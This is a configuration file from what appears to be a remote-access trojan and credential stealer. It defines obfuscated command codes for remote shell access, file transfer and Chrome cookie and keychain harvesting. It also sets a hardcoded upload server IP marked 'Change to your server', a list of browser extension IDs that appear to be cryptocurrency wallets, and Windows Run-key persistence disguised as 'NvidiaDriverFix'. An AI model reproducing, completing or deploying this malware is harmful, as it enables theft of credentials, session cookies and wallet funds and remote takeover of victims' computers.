PID_NAME0501       = ".store"
MACHINEID_HOST_FILE_NAME0501 = ".host"
DURATION_ERROR_WAIT0501   = 5
DAEMON_VERSION0501 = "1.0.0"

MSG_INFO0501 = "fwe9" 
MSG_LOG0501     = "1q2w" 
LOG_SUCCESS0501 = "true"
LOG_FAIL0501    = "false"
MSG_PING0501    = "poiu"  
MSG_FILE0501    = "qpwoe" 

COMMAND_INFORMATION0501          = "qwer" 
COMMAND_FILE_UPLOAD0501        = "asdf" 
COMMAND_FILE_DOWNLOAD0501      = "zxcv" 
COMMAND_OS_SHELL0501       = "vbcx"
SHELL_MODE_WAITGETOUT0501 = "qmwn"
SHELL_MODE_DETACH0501     = "qalp"
COMMAND_WAIT0501          = "ghdj" 
COMMAND_AUTO0501          = "r4ys"
AUTO_CHROME_GATHER_COMMAND0501    = "89io"
AUTO_CHROME_PREFRST_COMMAND0501   = "7ujm"
AUTO_CHROME_COOKIE_COMMAND0501    = "gi%#"
AUTO_CHROME_KEYCHAIN_COMMAND0501  = "kyci"
COMMAND_EXIT0501          = "dghh" 

UPLOAD_URL0501 = "http://154.58.204.15:8080"  # Change to your server
MAX_SLEEP0501 = 40
MIN_SLEEP0501 = 20
EXTENSION_NAMES = [
    "nkbihfbeogaeaoehlefnkodbefgpgknn", 
    "bfnaelmomeimhlpmgjnjophhpkkoljpa", 
    "ibnejdfjmmkpcnlpebklmnkoeoihofec", 
    "egjidjbpglichdcondbcbdnbeeppgdph",
    "acmacodkjbdgmoleebolmdjonilkdbch",
    "aholpfdialjgjfhomihkjbmgjidlcdno",
    "bhhhlbepdkbapadjdnnojkbgioiodbic",
    "dlcobpjiigpikoobohmabehhmhfoodbb",
    "dmkamcknogkgcdfhhbddcghachkejeap",
    "fnjhmkhhmkbjkkabndcnnogagogbneec",
    "hcjhpkgbmechpabifbggldplacolbkoh",
    "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
    "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "idnnbdplmphpflfnlkomgpfbpcgelopg",
    "ldinpeekobnhjjdofggfgjlcehhmanlj",
    "mcohilncbfahbmgdjkbpemcciiolgcge",
    "mkpegjkblkkefacfnmkajcjmabijhclg",
    "mopnmbcafieddcagagdcbnhejhlodfdd",
    "nhnkbkgjikgcigadomkphalanndcapjk",
    "ojggmchlghnjlapmfbnjholfjkiidbch",
    "onhogfjeacnfoofkfgppdlbmlmnplgbn",
    "pdliaogehgdbhbnmkklieghmmjkpigpa",
    "phkbamefinggmakgklpkljjmgibohnba",
    "ppbibelpcjmhbdihakflkdcoccbgbkpo"
    ]

REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_KEY = "NvidiaDriverFix"
PARAM = "lOkj874JEBV53NkuanotYXdzLmluZm8vd2FpdC5qcGc="